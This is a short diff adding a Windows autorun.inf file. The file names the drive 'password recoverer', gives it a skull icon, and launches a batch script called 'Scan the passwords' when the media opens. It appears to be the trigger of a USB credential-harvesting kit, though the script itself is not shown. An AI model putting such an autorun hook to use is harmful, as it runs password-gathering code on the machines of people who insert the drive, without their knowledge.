@@ -1,0 +1,5 @@
+[autorun]
+label=Récupérateur de mots de passe
+icon=skull.ico
+open=Scanner les mots de passe.bat
+action=Scanner les mots de passe
